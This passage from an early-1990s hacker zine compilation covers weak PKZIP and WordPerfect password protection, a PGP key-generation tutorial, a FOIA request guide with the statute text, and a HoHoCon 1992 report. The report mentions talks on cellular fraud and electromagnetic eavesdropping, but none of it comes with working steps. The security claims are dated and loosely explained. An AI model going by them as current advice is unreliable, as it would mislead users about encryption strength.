about a day on a fast '486) is high enough that anyone using the encryption
included in PKZIP 1.10 should be cautious (note:  as of this writing, PKZIP
version 2.00 has not been released, so it is not yet known whether future
versions of PKZIP will use an improved encryption algorithm).  The author's
primary purpose in releasing this program is to encourage improvements in ZIP
security.  The intended goal is NOT to make it easy for every computer user to
break into any ZIP, so no effort has been made to make the program
user-friendly.

        Likewise, WordPerfect is even more vulnerable.  I've caught a copy of
WordPerfect Crack out on the Internet and here is what it has to say about
WordPerfect's impossible-to-break methods:

(Taken from WPCRACK.DOC:)
-----
WordPerfect's manual claims that "You can protect or lock your documents with a
password so that no one will be able to retrieve or print the file without
knowing the password - not even you," and "If you forget the password, there is
absolutely no way to retrieve the document."  [1]

Pretty impressive!  Actually, you could crack the password of a Word Perfect
5.x file on a 8 1/2" x 11" sheet of paper, it's so simple.  If you are counting
on your files being safe, they are NOT.  Bennet [2] originally discovered how
the file was encrypted, and Bergen and Caelli [3] determined further
information regarding version 5.x.  I have taken these papers, extended them,
and written some programs to extract the password from the file.

                             PUBLIC KEY ENCRYPTION
                             ---------------------

        Back to the Masters of Deception analogy -- they were telephone
tapped.  Conventional encryption is good for home use, because only one person
could possibly know the password.  But what happens when you want to transmit
the encrypted data by telephone?  If the Secret Service is listening in on your
phone calls, you can't tell the password to the person that you want to send
the encrypted information to.  The SS will grab the password every single time.

        Enter Public-Key encryption!   The concepts behind Public-Key are very
in-depth compared to conventional encryption.  The idea here is that passwords
are not exchanged; instead a "key" which tells HOW to encrypt the file for the
other person is given to them.  This is called the Public Key.

        You retain the PRIVATE key and the PASSWORD.  They tell you how to
decrypt the file that someone sent you.  There is no "straight" path between
the Public Key and the Private Key, so just because someone HAS the public key,
it doesn't mean they can produce either your Secret Key or Password.  All it
means is that if they encrypt the file using the Public Key, you will be able
to decrypt it.  Furthermore, because of one-way encryption methods, the output
your Public Key produces is original each time, and therefore, you can't
decrypt the information you encrypted with the Public Key -- even if you
encrypted it yourself!

        Therefore, you can freely give out your own Public Key to anyone you
want, and any information you receive, tapped or not, won't make a difference.
As a result, you can trade anything you want and not worry about telephone
taps!  This technique supposedly is being used to defend the United States'
Nuclear Arsenal, if you disbelieve this is secure.

        I've actually talked with some of the makers of the RSA "Public-Key"
algorithm, and, albeit they are quite brilliant individuals, I'm somewhat
miffed at their lack of enthusiasm for aiding the public in getting a hold of
tools to use Public Key.  As a result, they are about to get railroaded by
people choosing to use PGP in preference to squat.

        Okay, maybe they don't have "squat" available.  In fact, they have a
totally free package with source code available to the USA public (no
exportation of code) which people can use called RSAREF.  Appendix E explains
more about why I'm not suggesting you use this package, and also how to obtain
it so you can see for yourself.

        Now that we know the basic concepts of Public-Key, let's go ahead and
create the basics for effective tap-proof communications.

Date: 1993/01/18 19:53 GMT

Pick your RSA key size:
        1)       384 bits- Casual grade, fast but less secure
        2)       512 bits- Commercial grade, medium speed, good security
        3)      1024 bits- Military grade, very slow, highest security
Choose 1, 2, or 3, or enter desired number of bits: 3  {DAMN STRAIGHT MILITARY}

Generating an RSA key with a 1024-bit modulus...
You need a user ID for your public key.  The desired form for this
user ID is your name, followed by your E-mail address enclosed in
<angle brackets>, if you have an E-mail address.
For example:  John Q. Smith <12345.6789@compuserve.com>

Enter a user ID for your public key:
The Racketeer <rack@lycaeum.hfc.com>

You need a pass phrase to protect your RSA secret key.
Your pass phrase can be any sentence or phrase and may have many
words, spaces, punctuation, or any other printable characters.
Enter pass phrase:                                     { Not echoed to screen }
Enter same pass phrase again:                          {  "    "    "    "    }
Note that key generation is a VERY lengthy process.

We need to generate 105 random bytes.  This is done by measuring the
time intervals between your keystrokes.  Please enter some text on your
keyboard, at least 210 nonrepeating keystrokes, until you hear the beep:
1 .*                                                             { decrements }
-Enough, thank you.
...................................................++++ ........++++
Key generation completed.

        It took a 33-386DX a grand total of about 10 minutes to make the key.
Now that it has been generated, it has been placed in your key ring.  We can
examine the key ring using the following command:

C:> pgp -kv

        We've now got a viable keyring with your own keys.  Now, you need to
extract your Public Key so that you can have other people encrypt shit and have
it sent to you.  In order to do this, you need to be able to mail it to them.
Therefore, you need to extract it in ASCII format.  This is done by the
following:

C:> pgp -kxa "The Racketeer <rack@lycaeum.hfc.com>"

    As we all know of our United State government in the modern era, Big
Brother is watching.  It is naive to think that we do not live in a world
similar to the one described is George Orwell's novel, 1984.  The government
keeps tabs on everything we do.  The federal government has thousands of
documents concerning individual citizens.  For example:

If you have worked for a federal agency or government contractor or have been
a member of any branch of the armed services, the federal government has a
file on you.

If you have participated in any federally financed project, some agency
probably has a record of it.

If you have been arrested by local, state or federal authorities and your
fingerprints were taken, the FBI maintains a record of you and that arrest.

If you have applied for or received a student loan or grant certified by the
government, the Department of Health, Education, and Welfare has recorded the
information.

If you have applied for or been investigated for a security clearance for any
reason, the Department of Defense has a record of you.

    And these records are not just records of application.  Take for example
the FBI.  Once you commit a crime, they are watching you.  They update your
file every time there is a major occurrence in your life i.e. marriage,
hospitalization, joining the military, committing another crime, etc.  If they
find the least likelihood of suspicion, they investigate you in depth to add
even more to your file.  People do not even realize how large their FBI file
is.

    If you were ever on a pirate board that got busted, and you had your info
on there, all the users' info on the bulletin board is transferred to the
federal government.  There a file is opened up for each individual user.  And
if you ever get in trouble with the law, that file will be opened up and used
against you if necessary.  Before I continue, I would like to site an example
of a man who ordered his file from the army.  This file was created when he
applied for a security clearance with the military years before.  In it said:

...  He owed 50 cents to his high school for not returning his locker key.
...  He dated 2 or 3 times a week, and was not intimate with his dates.
...  He was irresponsible because he owed a $5 jaywalking ticket in Seattle.

    So what can you do about this big bureaucratic machine we call our
government?  Simple, fight back!  The Freedom of Information Act (FOIA as it
will be referred to) was passed and allows you to obtain your personal records
from any governmental agency.  A typeup of most of the agencies plus the
actual act can be found at the end of this file.

    There are restrictions to the act, but it can be quite useful to any
individual who has had run-ins with the law or who just wants to know what the
federal government has on him.  You can even go to court against the
government if a document is denied to you and you think you deserve to see it.
The act is not widely know, and for good reason.  The government doesn't want
you to know what they are doing.  But alas, the information will be set free,
the people have a right to know!

    And don't think that the only interesting documents are the ones from the
FBI and CIA.  Fascinating documents can be gotten from the IRS, Department of
Health, Department of Schools, Federal Traffic Administration, HUD, National
Credit Union, with information you will never believe people who actually
store about you.


    The Specifics of Asking For Your Personal File From a Particular Agency
    -----------------------------------------------------------------------

    First of all, I would like to bring up a major misconception people make.
Most people assume that if you ask for your file from the FBI, and there isn't
a file on you, one will be created for you.  That is an untrue and extremely
paranoid statement.  The government has better things to do then open up files
on curious citizens.  And even if by some remote chance they do open up a file
for you, who cares?  They have a files on millions of people, its not like it
will hinder you in life.  Just be careful out there, that is all I can say.

    The most important thing that can be done when asking for information from
a governmental agency under the FOIA is to make it as brief, concise, and
specific as possible.  In this way, you will get your information, or refusal
as soon as possible, and you will also curb copying fees (which will be
discussed later).  First you have to find the agency that concerns you.  If
you are not sure which agency to apply to, send your letter to more than one.
There will be a list of agencies at the end of this file, but a complete list
of agencies can be found in the United States Government Manual.  This can be
found at any library.

    The request should be addressed to the agency's FOIA officer or to the
head of the specific agency.  Most agencies have a secretary to deal with all
the FOIA applications.  The smaller agencies, which you probably will not be
concerned with, might not have an officer.  On the bottom left hand corner of
the envelope "Freedom of Information Act Request" should be printed legibly.
This guarantees that your letter won't get caught in the paperwork shuffle.

    All agencies has FOIA regulation that you should look at.  They do not
want to send out 'sensitive' documents and whatnot.  These regulations also
describe the request process in detail.  Here you can also find out what
specific document you are looking for, reducing fees from the agency.  These
regulations can be found in "The Code of Federal Regulations", which can also
be found at your local library.

    Most agencies require that you get your letter 'notarized' or they won't
even look at it.  This prevents you from impersonating someone else and
getting their file.  To get your letter notarized, all you have to do is go to
your local bank.  Show some proof that the person signing the letter is you
(with an id or something) and they will notarize it.  Now the government has
no excuse for not taking your letter.
There are four parts to an FOIA request letter:

    1) Request being made under the FOIA.
    2) Records that are sought, as specifically as possible.
    3) Name and address of the person requesting the information.  Telephone
       number is not necessary, but you will find out about the outcome of
       your request much quicker.
    4) How much money you are willing to spend for the document (explained
       later).

Here is a sample letter, just fill in your information:

-----------------------------------------------------------------------------

Agency Head [or Freedom of Information Act Officer]
Name of Agency
Address of Agency
City, State, Zip Code

Re: Freedom of Information Act Request

    I request a copy of the following documents [or documents containing the
following information if you do not know the specific name of the document] be
provided for me: [identify the documents as accurately as possible]

    In order to help determine my status to assess fees, you should know that
I am an individual seeking information for personal use and not for commercial
use.  [always, always say you are an individual.  That way, you will not have
to pay extra fees because you are part of the media or a commercial endeavor.]

    [Optional] I am willing to pay fees for this request up to a maximum of
$__.  If you estimate the fees will exceed this limit, please inform me first.

    [Optional] I request a waiver of all fees for this request.  Disclosure of
the requested information to me is in the public interest because it is likely
to contribute significantly to public understanding of the operations or
activities  of the government and is not primarily in my commercial interest
[include specific information].

    Thank you for your consideration of this request.

                    Sincerely,

                    Name
                    Address
                    City, State, Zip Code
                    Telephone Number [Optional]
-----------------------------------------------------------------------------

Some of the things in the letter may not be understood at first, but I will
get to them.


Money:

    As you might have guessed, getting information under the FOIA is not free,
but it can be cheapened if you play your cards right.  As specified in the
letter, always say that you are an individual seeking information not for
commercial purposes.  Review is the process of going through documents and
checking if they can be sent to you or not.  Under the law, if you are a
private individual and are not requesting information for commercial purposes,
you cannot be charged with review fees!

    All agencies have set fees for copying a document.  Fees can also be taken
for searching for a document.  If you are an individual, you will be charged
the least amount of money.  Of course, if you have no idea in hell what the
name of the document is, and you are stabbing in the dark it is a good idea to
write in a set amount you are willing to spend.  When the amount is reached,
you will be notified.  This is in the letter above.

    You don't want to be jacked for a bill of 150 bucks if you send them a
letter 'just send me everything you got on me'.  Even if you have no idea what
they have, you can say 'please send me all the dossiers, legal documents, and
records you have under my name'.  Remember, the government likes bureaucratic
bullshit.  If you do not phrase you letter right, they will nail you on it.  A
lot of agencies will waive the cost of processing if it is under $3, and even
if you receive a bill, it should not exceed 5-10 dollars.

    If you can somehow prove that by accessing this information, it will help
the general public understand how the government works, you can waive the fee
altogether.  If through some form of shrewd doublespeak you can think of
something clever to satisfy this obligation, you can then request huge amounts
of documents, without paying a cent for them.

Restrictions:

    Of course, there are restrictions to the Freedom of Information Act.  Some
documentation may be said to be sensitive and out of reach of the public eye.
Any refusal to grant information through the FOIA may be taken to court, and
won.  In the act, it states that cases brought up because of the FOIA should
be put first on the court docket and tried as soon as possible.  Its always
worth a try.

    When a record contains some information that is withheld, it does not
necessarily mean that the whole record is exempt.  The federal agency is
obliged to cut out the portion that is sensitive, and send you the portion it
can disclose.  The agency must also give you a reason why it cut out this
portion of the document.

Here are a few of the reasons for exemption:

1) Classified Documents - Classified Documents may be withheld.  The documents
   may be classified in the interest of national defense and foreign policy.
   Classified documents may still be requested.  The agency will review the
   document to determine whether it still needs protection.  If a requested
   document is already declassified, it can be easily requested.

2) Internal Personal Rules and Practices - This exemption covers matters
   related to an agency's internal rules and practices.  Requests for Internal
   schedules, administrative manuals and the like can be refused.

3) Confidential Business Information - Trade secrets or commercially valuable
   plans do not have to be released.  Commercial or financial information does
   not also have to be released, as it might hurt an individual.

4) Personal Privacy - This covers personnel, medical, and similar files of
   which disclosed would interfere with personal privacy.  This exemption has
   importance because it prevents a commercial business from getting
   information about you.  At the same time, it allows you to get private
   information stored about yourself.  This is why it is important to get your
   letter notarized.

5) Law Enforcement - This allows law enforcement agencies to withhold law
   enforcement records in order to protect themselves and others.  If there is
   a trial going on, you can't request your file.  Its smart to get your file
   from the feds now, while you still can.  Don't wait until you get in some
   serious shit, and then you don't even know what they have on you!  If you
   know what they have on you, you know how to fight back.

    If you request does get refused, there is still hope.  If you think that
under the FOIA's legal terms you deserve to have the document, you can send a
letter of appeal.  This letter can also be used to argue that their processing
charge was unfair.  The appeal letter is shown below:

    Here is a copy of the Freedom of Information Act and all of its
amendments.  It may prove to have some usefulness.  You might want to read
through it to understand the law better.  I would not recommend reading it if
you are in a suicidal state.

------------------------------------------------------------------------------

                   FULL TEXT OF FREEDOM OF INFORMATION ACT,
                    AS AMENDED IN 1974 BY PUBLIC LAW 93-502


% 552  Public Information; agency rules, opinions, orders, records, and
    proceedings
  (a) Each agency shall make available to the public information as follows:
  (1) Each agency shall separately state and currently publish in the Federal
Register for the guidance of the public-
      (A) descriptions of its central and field organization and the
     established places at which, the employees (and in the case of a
     uniformed service, the members) from whom, and the method whereby, the
     public may obtain information, make submittals or requests, or obtain
     decisions;
      (B) statements of the general course and method by which its functions
     are channeled and determined, including the nature and requirements of
     all formal and informal procedures available;
      (C) rules of procedures, descriptions of forms available or the places
     at which forms may be obtained, and instructions as to the scope and
     contents of all papers, reports, or examinations;
      (D) substantive rules of general applicability adopted as authorized by
     law, and statements of general policy or interpretations of general
     applicability formulated and adopted by the agency; and
      (E) each amendment, revision, or repeal of the foregoing.

Except to the extent that a person has actual and timely notice of the terms
thereof, a person may not in any manner be required to resort to, or be
adversely affected by, a matter required to be published in the Federal
Register and not so published.  For the purpose of this paragraph matter
reasonably available to the class of persons affected thereby is deemed
published in the Federal Register when incorporated by reference therein with
the approval of the Director of the Federal Register.
  (2) Each agency, in accordance with published rules, shall make available
for public inspection and copying-
       (A) final opinions, including concurring and dissenting opinions, as
     well as orders, made in the adjudication of cases;
       (B) those statements of policy and interpretations which have been
     adopted by the agency and are not published in the Federal Register; and
       (C) administrative staff manuals and instructions to staff that affect
     a member of the public;

unless the materials are promptly published and copies offered for sale.  To
the extent required to prevent a clearly unwarranted invasion of personal
privacy, an agency may delete identifying details when it makes available or
publishes an opinion, statement of policy, interpretation, or staff manual or
instruction.  However, inn each case the justification for the deletion shall
be explained clearly in writing.  Each agency shall also maintain and make
available for public inspection and copying current indexes providing
identifying information for the public as to any matter issued, adopted, or
promulgated after July 4, 1967, and required by this paragraph to be made
available or published.  Each agency shall promptly, quarterly or more
frequently, and distribute (by sale or otherwise) copies of each index or
supplement thereto unless it determines by order published in the Federal
Register that the publication would be unnecessary and impracticable, in which
case the agency shall nonetheless provide copies of such index on request at a
cost not to exceed the direct cost of duplication.  A final order, opinion,
statement of policy, interpretation, or staff manual or instruction that
affects a member of the public may be relied on, used, or cited as precedent
by an agency against a party other than an agency only if-
      (i) it has been indexed and either made available or published as
    provided by this paragraph; or
      (ii) the party has actual and timely notice of the terms thereof.
  (3) Except with respect to the records made available under paragraphs (1)
and (2) of this subsection, each agency, upon any request for records which
(A) reasonably describes such records and (B) is made in accordance with
published rules stating the time, place, fees (if any), and procedures to be
followed, shall make the records promptly available to any person.
  (4)(A) In order to carry out the provisions of this section, each agency
shall promulgate regulations, pursuant to notice and receipt of public
comment, specifying a uniform schedule of fees applicable to all constituent
units of such agency.  Such fees shall be limited to reasonable standard
charges for documents search and duplication and provide for recovery of only
the direct costs of such search and duplication.  Documents shall be furnished
without charge or at a reduced charge where the agency determines that waiver
or reduction of the fee is in the public interest because furnishing the
information can be considered as primarily benefiting the general public.
     (B) On complaint, the district court of the United States in the district
   in which the complainant resides, or has his principal place of business,
   or in which the agency records are situated, or in the District of
   Columbia, has jurisdiction to enjoin the agency from withholding agency
   records and to order the production of any agency records improperly
   withheld from the complainant.  In such a case the court shall determine
   the matter de novo, and may examine the contents of such agency records in
   camera to determine whether such records or any part thereof shall be
   withheld under any of the exemptions set forth in subsection (b) of this
   section, and the burden is on the agency to sustain its action.
     (C) Notwithstanding any other provision of law, the defendant shall serve
         an answer or otherwise plead to any complaint made under the
         subsection within thirty days after service upon the defendant of the
         pleading i which such complaint is made, unless the court otherwise
         directs for good cause shown.
     (D) Except as to cases the court considers of greater importance,
         proceedings before the district court, as authorized by this
         subsection, and appeals therefrom, take precedence on the docket over
         all cases and shall be assigned for hearing and trial or for argument
         at the earliest practicable date and expedited in every way.
     (E) The court may assess against the United States reasonable attorney
         fees and other litigation costs reasonably incurred in any case under
         this section in which the complainant has substantially prevailed.
     (F) Whenever the court orders the production of any agency records
         improperly withheld from the complainant and assesses against the
         United States reasonable attorney fees and other litigation costs,
         and the court additionally issues a written finding that the
         circumstances surrounding the withholding raise we questions whether
         agency personnel acted arbitrarily or capriciously with respect to
         the withholding, the Civil Service Commission shall promptly initiate
         a proceeding to determine whether disciplinary action is warranted
         against the officer or employee who was primarily responsible for the
         withholding.  The Commission, after investigation and consideration of
         the evidence submitted, shall submit its findings and recommendations
         to the administrative authority of the agency concerned and shall
         send copies of the findings and recommendations to the officer or
         employee or his representative.  The administrative authority shall
         take the corrective action that the Commission recommends.
     (G) In the event of noncompliance with the order of the court, the
         district court may punish for contempt the responsible employee, and
         in the case of a uniformed service, the responsible member.
  (5)  Each agency having more than one members shall maintain and make
available for public inspection a record of the final votes of each member in
every agency proceeding.
  (6)(A) Each agency, upon any request for records made under paragraph
(1),(2), or (3) of the subsection, shall-
       (i) determine within ten days (except Saturdays, Sundays, and legal
     public holidays) after the receipt of any such request whether to comply
     with such request and shall immediately notify the person making such
     request of such determination and the reasons therefor, and of the right
     of such person to appeal to the head of the agency and adverse
     determination; and
       (ii) make a determination with respect to any appeal within twenty days
     (excepting Saturdays, Sundays, and legal public holidays) after the
     receipt of such appeal.  If on appeal the denial of the request for
     records is in whole or in part upheld, the agency shall notify the person
     making such request of the provisions for judicial review of that
     determination under paragraph (4) of this subsection.
     (B) In unusual circumstances as specified in this subparagraph, the time
  limits prescribed in either clause (i) or clause (ii) of subparagraph (A)
  may be extended by written notice to the person making such request setting
  forth the reasons for such extension and the date on which a determination
  is expected to be dispatched.  NO such notice shall specify a date that
  would result in an extension for more than ten working days.  As used in
  this subparagraph, "unusual circumstances" means, but only to the extent
  reasonably necessary to the proper processing of the particular request-
       (i) the need to search for and collect the requested records from field
     facilities or other establishments that are separate from the office
     processing the request;
       (ii) the need to search for, collect, and appropriately examine a
     voluminous amount of separate and distinct records which are demanded in
     a single request; or
       (iii) the need for consultation, which shall be conducted with all
     practicable speed, with another agency having a substantial interest in
     the determination of the request or among two or more components of the
     agency having substantial subject-matter interest therein.
     (C) Any person making a request to any agency for records under paragraph
  (1), (2), or (3) of this subsection shall be deemed to have exhausted his
  administrative remedies with respect to such request if the agency fails
  comply with the applicable time limit provisions of this paragraph.  If the
  Government can show exceptional circumstances exist and that the agency is
  exercising due diligence in responding to the request, the court may retain
  jurisdiction and allow the agency addition time to complete its review of
  the record.  Upon any determination by an agency to comply with a request
  for records, the records shall be made promptly available to such person
  making such request.  Any notification of denial of any request for records
  under this subsection shall set forth the names and titles or positions of
  each person responsible for the denial of such request.
(b) This section does not apply to matters that are-
(1) (A) specifically authorized under criteria established by an Executive
 Order to be kept secret in the interest of national defense or foreign policy
 and (B) are in fact properly classified pursuant to each Executive Order;
(2) related solely to the internal personnel rules and practices of the
 agency;
(3) specifically exempted from disclosure by statute;
(4) trade secrets and commercial or financial information obtained from a
 person and privileged or confidential;
(5) inter-agency or intra-agency memorandums or letters which would not be
 available by law to a party other than an agency in litigation with the
 agency;
(6) personnel and medical files and similar files the disclosure of which
 would constitute a clearly unwarranted invasion of personal privacy;
(7) investigatory records compiled for law enforcement purposes, but only to
 the extent that the production of such records would (A) interfere with
 enforcement proceeding, (B) deprive a person of a right to a fair trial or an
 impartial adjudication, (C) constitute an unwarranted invasion of personal
 privacy, (D) disclose the identity of a confidential source and, in the case
 of a record compiled by a criminal law enforcement authority in the course of
 a criminal investigation, or by an agency conducting a lawful national
 security intelligence investigation, confidential information only furnished
 by the confidential source, (E) disclose investigative techniques and
 procedures, or (F) endanger the life or physical safety of law enforcement
 personnel;
(8) contained in or related to examination, operating or condition reports
 prepared by, one behalf of, or for the use of an agency responsible for the
 regulation or supervision of financial institutions; or
(9) geological and geophysical information and data, including maps,
concerning wells.

Any responsible segregable portion of a record shall be provided to any person
requesting such record after deletion of the portions which are exempt  under
the subsection.
  (c) This section does not authorize withholding of information or limit the
availability of records to the public, except as specifically stated in this
section.  This section is not authority to withhold information from Congress.
  (d) On or before March 1 of each calendar year each agency shall submit a
report covering the preceding calendar year to the Speaker of the House of
Representatives and President of the Senate for referral to the appropriate
committees of Congress.  The report shall include-
  (1) the number of determinations made by such agency not to comply with
 requests for records made to such agency under subsection (a) and the reasons
 for each determination;
  (2) the number of appeals made by persons under subsection (a)(6), the
 result of such appeals, and the reason for the action upon each appeal that
 results in a denial of information;
  (3) the names and titles or positions of each person responsible for the
 denial of records requested under this section, and the number of instances
 for participation of each;
  (4) the results of each proceeding conducted pursuant to subsection
 (a)(4)(F), including a report of the disciplinary action taken against the
 officer or employee who was primarily responsible for improperly withholding
 records or an explanation of why disciplinary action was not taken;
  (5) a copy of every rule made by such agency regarding this section;
  (6) a copy of the fee schedule and the total amount of fees collected by the
agency for making records available under this section; and
  (7) such other information as indicates efforts to administer fully this
section.

The Attorney General shall submit an annual report on or before March 1 of
each calendar year which shall include for the prior year a listing of the
number of cases arising under this section, the exemption involved in each
case, the disposition of such case, and the cost, fees, and penalties assessed
under subsections (a)(4)(E),(F), and (G).  Such report shall also include a
description of the efforts undertaken by the Department of Justice to
encourage agency compliance with this section.
  (e) for purposes of this section, the term "agency" is defined in section
551(1) of this title includes any executive department, military department,
Government corporation, Government controlled corporation, or other
establishment in the executive branch of the Government (including the
Executive Office of the President), or any independent agency.

In Conclusion:

    The Freedom of Information Act is a powerful tool that can be used to
benefit yourself and to find out what the feds keep in their log books on you.
Use it, just don't abuse it.  It gives the individual much power over the
government.  We no longer have to prove a reason to know the information, but
we have a right to know the information.  Its the government's job to keep the
information away from us.  I would also like to mention that regulations and
all documents that agencies carry can be found in any major library.  This
will save you cash and frustration.  Anyways, keep the faith, its not that bad
out there.  And watch comedy central, its good for you.

                              HoHoCon 1992
                               Miscellany




The hackers were getting nervous.  It was understandable.  Just a few weeks
before HoHoCon and already two other "get-togethers" had experienced
turbulence from the authorities.

Rumors began to fly that HoHo was to be the next target.  Messages bearing
ill-tidings littered the underground.  Everyone got worked into a frenzy about
the upcoming busts at HoHoCon.  People began to cancel their reservations
while others merely refused to commit one way or the other.

But, amidst all the confusion and hype, many declared "Let them try to
raid us!  I'm going anyway!"  These were the few, the proud...the stupid.

-------------------------------------------------------------------------------

HoHoCon as I saw it - Erik Bloodaxe (Chris Goggans)

I arrived at the Allen Park Inn in the mid afternoon on Friday the 18th.
I was promptly greeted by several of my cohorts and a loping transient
who introduced himself as "Crunchhhhhhhhh."  Yes, John Draper, the infamous
Captain Crunch had actually ventured outward to attend our little party.
(Yes, Virginia, the rumors are true:  The Captain is toothless, unkempt,
overbearing and annoying as all hell.)

I followed Scott Chasin back to our room, the pack of other early arrivals
in close file behind.  After storing my gear I noticed that Draper was
looming in the doorway ranting furiously about all the smoking in our room.
"I've never heard of a hacker who smoked," exclaimed the Captain.
Taking this as my cue, I bummed a Djarum off of Crimson Death and took great
glee in adding my fumes to the enveloping fog.

Draper spent the next 30 minutes attempting to eavesdrop on various
conversations in which various old friends were catching up.  Not knowing
any of us personally, he nonetheless felt obligated to offer his comments
about our discussions about life and college and music amidst his coughing
and complaining about the smoke.

After some time everyone was banished from the room and several of us
went out to eat.  Scott Chasin, myself, two hackers (The Conflict, & Louis
Cypher) along with Gary Poole (covering the entire mess for Unix World) took
off for the nearest grease pit.  Taco Bell won in proximity, and once
surrounded by burritos Scott, Conflict and I began our rant about Unix
Security (the lack thereof).  Gary whipped out his Unix World pen and pad
and began taking notes.  I am uncertain whether or not it was the content
of our spiel or the asides I repeatedly made regarding the bevy of giggling
coeds that garnered the most notes in Gary's booklet.

Back at the Con things were spicing up.  More people had begun to arrive
and the Allen Park Inn staff began to worry about their safety and that of
their other guests.  One remarked to Jesse (Drunkfux), the sponsor of HoHoCon, "That Draper
fellow needs to stay out of the lobby.  He was eating large
amounts of flesh off his hands and it was scaring some of the visitors."
The staff did not know what to think at all when a father arrived with his
three sons and after purchasing a room on his credit card told the boys, "Ok
guys, Mom will be picking you up on Sunday."

This did not concern most of us.  It was straight to the bar
for us, where Rambone bought Scott & myself a round of Kamikazes.  Also at
the bar was Bootleg who had just gotten out.  (Of what, and for what you
can find out on your own.)  Bootleg is probably the smartest biker I have
ever had the pleasure to meet.  We talked about sex, drugs, hawgs, computers,
cellular fraud and how close the nearest cabaret was.

A small controversy began to arise amidst the hackers at the bar.  Stationed
near one end of the room was a table lined with older men.  "FEDS," someone
murmured, gesturing at the group.

"Good for them," I said, and left the bar to look for Jesse.  When I returned
several minutes later the hackers had engaged the strangers in conversation
and found that they weren't feds after all.  Among this group were
Jim Carter of Houston-based Bank Security, and Bernie Milligan of
Communications & Toll Fraud Specialists, Inc.  Once this news was out
tensions eased and everyone continued with their libations.

Suddenly I became aware that there was girl in the room.  I had seen her out
in the courtyard previously but now she was alone.  Turning on my
"Leisure Suit Larry" charm I grabbed the seat next to her.  Melissa had arrived
from Austin to cover the event for Mondo-2000.  She surprised me by telling
me that she knew who I was, where I worked, and even knew my extension number.
(I almost fell off the barstool.)

Jim & Bernie came over and joined us at the bar.  Bootleg, Chaoswiz, Melissa
and I engaged them in wild stories about UFO's, hacking, the NSA & the CIA.
(Bernie alleged that he was ex-NSA, and Jim ex-CIA.  We have not yet
determined if they were acting under orders from Col. Jim Beam & Gen. Jack
Daniels.)

After the ensuing debates on the true formation of the NSA, the group broke up
and Melissa and I took off to MC Allah's room to partake of the keg he had
brought.  We walked in the room and were greeted with the sight of a four-foot
boy with a syringe sticking out of his arm.  This was a bit much, even for me.
I snatched his "medication" away from him and found that it was really only
some type of growth hormone.  The boy, 8-Ball, was actually 15 and his parents
had him on hormones to stimulate his growth.  8-Ball was totally whacked
out his mind nonetheless.  I think he had ingested such a diverse amount of
God knows what by the time we arrived that he was lucky to remember where
he was.  Later that evening he would become convinced that he was Scott
Chasin and confessed to quite a bit of wrongdoing just before he gave offerings
at the porcelain alter.

Conversations in the keg room left something to be desired.  One large hacker
named Tony looked at Melissa and in his best British accent asked if he
could fondle her breasts.  And the debate between MC Allah and Hunter about
who could drink the most alcohol reached a climax when both stuck their heads
under the keg spigot for extended periods of time.

Sometime just before 11:00 the hotel guard, attired in Raiders jacket and
a really, really big snow hat (the kind with the poofy ball on top) showed
up brandishing his paper baton, (A rolled up Houston Press).  "You all
needs to get to yaw roomz, nah.  I ain'tz ta gonna tell yaw no mo'."
Everyone looked the guard over and moved back into the keg room.  Thus was
born, "Homie da Guard."  After he wandered away, everyone moved back out
onto the porch.

It was getting late and I was supposed to speak the next morning so I tried to
get into our room.  Scott Chasin, hacker extrordinaire, had locked me out.
After beating on the door for 10 minutes, the windows for 5, the walls for 10,
and letting the phone ring for another 15 minutes I decided that Scott was a
bit too tipsy to unlock the door so I crashed out on Jesse's floor.

That night, the water pipes broke.  There was some speculation that those
evil hackers had "hacked the system."  Not.

While complaining about the lack of water that night, someone overheard
three young attendees at a bank of pay phones attempting to order up
a few escorts on "credit."  Rumor has it they were successful.

The next morning was chaos.  By the time we arrived at the conference room
there were about 150 people inside.  Louis Cypher sat at the door collecting
money for the raffle and getting everyone to sign the guest book.  Jesse
and others were setting up various video equipment and getting things
in order.  In the back of the room, Bernie sat scanning the crowd with a
super-ear, recording the conversations of those sitting.

Crunch was up in arms again.  "If everyone in here doesn't stop smoking
I won't be able to do my speech.  If you all want to hear me talk, you
will have to stop smoking."  Several more cigarettes lit up. After
speaking with management, Crunch came back in and asked if everyone smoking
would at least move to one side of the auditorium nearest the door.
With hesitation, the crowd conceded.

The conference got underway with consultant Ray Kaplan taking a census of
those in attendance.  The group ranged from under 15 to over 50, had
professionals and hobbyists, and had enthusiasts for every conceivable
type operating system.  Ray went on to elaborate on one of his audio
conferences in which an FBI officer alluded that one of their key
sources of information was "I.R.C."

Bootleg got up and spoke on the vast potentials involved with cellular
fraud.  He discussed how to monitor the reverse channel to obtain ESNs,
and where to obtain the equipment to allow you to do such a thing.  He
later handed out diskettes (IBM format) containing information on how
to reprogram cellular phones and where to obtain the equipment necessary
to pick subscriber numbers out of the air.

Up next, myself and Chasin.  Our topic was a bit obscure and cut deliberately
short due to concerns about the nature of our speech.  During the Dateline
NBC piece that featured Chasin a piece of information flashed on the screen
that alluded to UFO information stored on military computers.  Chasin
and I had gained possession of the research database compiled by the hackers
who were looking into this.  We discussed their project, the rumors surrounding
their findings and the fear surrounding the project.  Not knowing the true
details of this we declined to comment any further, but made the documentation
available to anyone who wanted a copy.  We finished our speech by answering
questions about Comsec, Consultants, etc.

Steve Ryan, a Houston lawyer with a great deal of interest in the
legal aspects of cyberspace spoke next.  He covered several of the current
issues affecting the community, spoke on laws in effect, cases pending,
and gave an insight to his background that led him to focus in on
the issues concerning the electronic community.

Next, Jim Carter gave a quick and dirty demonstration of how to monitor
electromagnetic radiation and how to do a simple data recovery from this
noise.  He monitored a small data terminal from a portable television set
that was completely unmodified.  He then spoke on how to read the
EMR from such things as plumbing, the ground, off of window panes, etc.
Jim's speech, although highly intriguing, got extremely vague at points,
especially regarding technology needed, his own background, etc.
(We will attribute this to his "CIA" training.)

The Hotel Officials showed up and demanded that everyone get out immediately.
Apparently someone had staggered into the kitchen, drunk, and broken
something.  Steve Ryan left to smooth things out a bit.  After a few minutes
he returned and told everyone that they could stay, but to keep it quiet
tonight.  Thus the secret plans of some to drive the hotel golf cart
into the pool were crushed.

The raffle proved to be an exercise in banality.  Everything from
flashing street lights to SunOS 4.1.3 to T-shirts to books were
auctioned off.  One lucky devil even got an official Michael Jackson
candy bar.

The folks from RDT (Count Zero and White Knight) handed out a large amount
of photocopied goodies such as the new "Forbes" article on hackers,
a complete set of the old 70's telephony 'zine "TEL" as well as assorted other
flyers and pamphlets.

Up next, Louis Cypher spoke about his entanglement with the law
regarding his front-page bust for counterfeiting.  He told of his
experiences with the law, how they got involved in such a dastardly
deed, what jail was like on the inside, and advice against anyone
else considering such a thing.

Up last, John Draper.  Draper had managed by this time to annoy almost
